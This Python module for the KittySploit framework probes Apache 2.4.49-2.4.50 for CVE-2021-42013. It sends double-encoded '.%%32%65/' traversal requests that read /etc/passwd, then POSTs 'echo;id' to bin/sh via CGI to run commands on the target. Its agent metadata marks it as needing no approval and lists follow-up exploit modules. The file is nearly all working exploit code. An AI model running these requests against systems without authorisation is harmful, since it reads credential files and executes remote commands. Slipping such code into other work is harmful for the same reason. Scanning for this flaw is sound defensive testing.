#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache HTTP Server 2.4.49-2.4.50 double-encoded path traversal / CGI RCE (CVE-2021-42013)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache HTTP Server 2.4.49-2.4.50 - Path Traversal / RCE Detection (CVE-2021-42013)',
        'description': (
            'Detects CVE-2021-42013 (incomplete fix for CVE-2021-41773) using double-encoded '
            '.%%32%65/ traversal to read /etc/passwd or execute via CGI bin/sh.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2021', 'apache', 'httpd', 'lfi', 'rce',
            'path-traversal', 'unauth', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 6,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'exploits/linux/http/apache_cve_2021_42013_rce',
                    'scanner/http/cve_2021_41773_detect',
                ],
            },
        },
        'references': [
            'https://httpd.apache.org/security/vulnerabilities_24.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-42013',
        ],
        'cve': 'CVE-2021-42013',
    }

    def _trav(self) -> str:
        # Double-encoded "." (%2e -> %%32%65) as used by Greenbone.
        return '/' + ('.%%32%65/' * 9)

    def run(self):
        trav = self._trav()
        for prefix in ('/cgi-bin', '/icons', ''):
            path = f'{prefix}{trav}etc/passwd'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and r.status_code == 200 and re.search(r'root:.*:0:0:', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='Apache path traversal (CVE-2021-42013): /etc/passwd readable',
                    path=path,
                )
                return True

        for prefix in ('/cgi-bin', '/icons', ''):
            path = f'{prefix}{trav}bin/sh'
            r = self.http_request(
                method='POST',
                path=path,
                data='echo;id',
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=False,
            )
            if r and re.search(r'uid=\d+', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='Apache CGI RCE (CVE-2021-42013): id via bin/sh',
                    path=path,
                )
                return True
        return False
